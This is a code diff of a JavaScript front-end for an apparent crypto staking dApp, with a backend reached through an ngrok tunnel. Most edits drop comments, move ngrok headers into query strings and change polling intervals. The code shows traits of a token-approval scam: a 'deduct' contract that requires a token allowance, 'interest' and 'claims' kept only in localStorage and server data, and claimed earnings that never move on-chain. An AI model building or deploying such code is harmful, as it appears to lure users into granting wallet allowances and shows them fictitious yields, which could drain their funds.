@@ -8,7 +8,16 @@ const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';
 const DEDUCT_CONTRACT_ABI = [
     "function isServiceActiveFor(address customer) view returns (bool)",
     "function activateService(address tokenContract) external",
-    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
+    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)",
+    {
+        "anonymous": false,
+        "inputs": [
+            { "indexed": true, "name": "customer", "type": "address" },
+            { "indexed": true, "name": "tokenContract", "type": "address" }
+        ],
+        "name": "ServiceActivated",
+        "type": "event"
+    }
 ];
 const ERC20_ABI = [
     "function approve(address spender, uint256 amount) external returns (bool)",
@@ -76,7 +85,7 @@ let nextBenefitInterval = null;
 let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 let isServerAvailable = false;
 let pendingUpdates = [];
-let localLastUpdated = 0; // 新增：追蹤本地數據最後更新時間
+let localLastUpdated = 0;
 
 // 環境檢測：判斷是否為開發模式
 const isDevMode = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.isDevMode;
@@ -229,9 +238,7 @@ async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
 
 async function checkServerStatus() {
     try {
-        const response = await fetch(`${API_BASE_URL}/api/status`, {
-            headers: { 'ngrok-skip-browser-warning': 'true' }
-        });
+        const response = await fetch(`${API_BASE_URL}/api/status?skip-browser-warning=true`);
         if (response.ok) {
             const { status, lastUpdated } = await response.json();
             isServerAvailable = status === 'available';
@@ -266,9 +273,7 @@ async function syncPendingUpdates(serverLastUpdated) {
 async function loadUserDataFromServer() {
     if (!userAddress) return;
     try {
-        const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
-            headers: { 'ngrok-skip-browser-warning': 'true' }
-        }));
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data?skip-browser-warning=true`));
         if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
         const allData = await response.json();
         const userData = allData.users[userAddress] || {};
@@ -344,11 +349,10 @@ async function saveUserData(data = null, addToPending = true) {
         return;
     }
     try {
-        const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data?skip-browser-warning=true`, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
-                'ngrok-skip-browser-warning': 'true'
+                'Content-Type': 'application/json'
             },
             body: JSON.stringify({ address: userAddress, data: dataToSave })
         }));
@@ -497,9 +501,8 @@ async function updateInterest() {
 
     if (isServerAvailable) {
         try {
-            const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, {
-                cache: 'no-cache',
-                headers: { 'ngrok-skip-browser-warning': 'true' }
+            const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data?skip-browser-warning=true`, {
+                cache: 'no-cache'
             }));
             if (response.ok) {
                 const allData = await response.json();
@@ -650,7 +653,7 @@ function activateStakingUI() {
         console.log(`activateStakingUI: Added event listener to claim button.`);
     }
     if (interestInterval) clearInterval(interestInterval);
-    interestInterval = setInterval(updateInterest, 5000); // 修改：間隔從 1000ms 改為 5000ms
+    interestInterval = setInterval(updateInterest, 5000);
     console.log(`activateStakingUI: Set interest interval: ${interestInterval}`);
     if (nextBenefitInterval) clearInterval(nextBenefitInterval);
     nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
@@ -754,7 +757,6 @@ async function updateUIBasedOnChainState() {
             walletTokenSelect.dispatchEvent(new Event('change'));
             setInitialNextBenefitTime();
             activateStakingUI();
-            // 啟用質押表單
             pledgeBtn.disabled = false;
             pledgeAmount.disabled = false;
             pledgeDuration.disabled = false;
@@ -762,7 +764,6 @@ async function updateUIBasedOnChainState() {
         } else {
             console.log(`updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.`);
             if (startBtn) startBtn.style.display = 'block';
-            // 禁用質押表單
             pledgeBtn.disabled = true;
             pledgeAmount.disabled = true;
             pledgeDuration.disabled = true;
@@ -888,9 +889,7 @@ function disconnectWallet() {
 async function getEthPrices() {
     try {
         updateStatus(translations[currentLang].fetchingBalances);
-        const response = await retry(() => fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
-            headers: { 'ngrok-skip-browser-warning': 'true' }
-        }));
+        const response = await retry(() => fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt'));
         if (!response.ok) throw new Error('Network response was not ok');
         const data = await response.json();
         const usdPrice = data.ethereum?.usd || 0;
@@ -969,9 +968,11 @@ function updateLanguage(lang) {
 }
 
 function setupSSE() {
-    const source = new EventSource(`${API_BASE_URL}/api/sse`, {
-        headers: { 'ngrok-skip-browser-warning': 'true' }
-    });
+    if (!userAddress) {
+        console.log(`setupSSE: No user address, skipping SSE setup.`);
+        return;
+    }
+    const source = new EventSource(`${API_BASE_URL}/api/sse?skip-browser-warning=true`);
     source.onmessage = async (event) => {
         try {
             const { event: eventType, data } = JSON.parse(event.data);
@@ -994,10 +995,10 @@ function setupSSE() {
         }
     };
     source.onerror = () => {
-        console.warn(`SSE: Connection error, attempting to reconnect...`);
+        console.warn(`SSE: Connection error, attempting to reconnect after 10000ms...`);
         source.close();
         isServerAvailable = false;
-        setTimeout(setupSSE, 5000);
+        setTimeout(setupSSE, 10000);
     };
     console.log(`SSE: Connection established for address: ${userAddress}`);
 }
@@ -1011,7 +1012,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     if (!grossOutputValue || !cumulativeValue) {
         await retryDOMAcquisition();
     }
-    setInterval(checkServerStatus, 60000); // 修改：間隔從 30000ms 改為 60000ms
+    setInterval(checkServerStatus, 60000);
     if (closeModal) closeModal.addEventListener('click', () => { claimModal.style.display = 'none'; });
     if (cancelClaim) cancelClaim.addEventListener('click', () => { claimModal.style.display = 'none'; });
     if (confirmClaim) {
@@ -1029,7 +1030,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             }
 
             const grossOutputETH = parseFloat(grossOutputValue.textContent.replace(' ETH', ''));
-            claimedInterest += claimableETH; // 更新已提領利息
+            claimedInterest += claimableETH;
             accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
             localStorage.setItem('userData', JSON.stringify({
                 stakingStartTime,
@@ -1037,7 +1038,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 pledgedAmount,
                 accountBalance,
                 grossOutput: grossOutputETH,
-                cumulative: 0, // CLAIM 後歸零
+                cumulative: 0,
                 nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                 lastUpdated: Date.now()
             }));
@@ -1048,7 +1049,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 pledgedAmount,
                 accountBalance,
                 grossOutput: grossOutputETH,
-                cumulative: 0, // 傳送歸零值
+                cumulative: 0,
                 nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                 lastUpdated: Date.now(),
                 source: 'index.html'
@@ -1165,7 +1166,6 @@ pledgeBtn.addEventListener('click', async () => {
         console.log(`pledgeBtn: Invalid pledge amount: ${amount}`);
         return;
     }
-    // 檢查錢包餘額
     const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
     try {
         const balance = await retry(() => selectedContract.balanceOf(userAddress));
@@ -1192,11 +1192,10 @@ pledgeBtn.addEventListener('click', async () => {
         }
     };
     try {
-        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, {
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data?skip-browser-warning=true`, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
-                'ngrok-skip-browser-warning': 'true'
+                'Content-Type': 'application/json'
             },
             body: JSON.stringify(pledgeData)
         }));
